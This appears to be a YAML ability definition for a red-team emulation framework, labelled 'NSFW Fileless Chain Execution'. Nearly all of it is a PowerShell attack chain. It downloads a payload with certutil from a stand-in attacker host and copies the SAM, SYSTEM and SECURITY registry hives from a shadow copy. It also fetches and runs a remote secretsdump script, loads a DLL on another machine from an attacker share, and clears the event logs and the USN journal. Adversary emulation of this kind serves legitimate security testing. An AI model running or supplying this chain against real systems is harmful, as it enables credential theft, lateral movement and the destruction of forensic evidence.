
- id: nsfw_fileless_chain
  name: NSFW Fileless Chain Execution
  description: Full fileless red team attack chain using CVE-2021-36934 and DLL injection.
  tactic: execution
  technique:
    attack_id: T1218
    name: Signed Binary Proxy Execution
  platforms:
    windows:
      psh:
        command: |
          certutil -urlcache -split -f "http://attacker-ip/nsfw.jpg" $env:TEMP\nsfw.jpg
          Add-Type -Assembly "System.IO.Compression.FileSystem"
          [System.IO.Compression.ZipFile]::ExtractToDirectory("$env:TEMP\nsfw.jpg", "$env:TEMP\stage")
          Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" "$env:TEMP\SAM"
          Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" "$env:TEMP\SYSTEM"
          Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" "$env:TEMP\SECURITY"
          IEX (New-Object Net.WebClient).DownloadString("http://attacker-ip/secretsdump.ps1")
          Invoke-SecretsDump -System $system -Security $security -Sam $sam
          Invoke-Command -ScriptBlock { rundll32.exe \\attacker\share\nsfw.dll,#1 } -ComputerName 192.168.1.10 -Credential $cred
          wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D C:
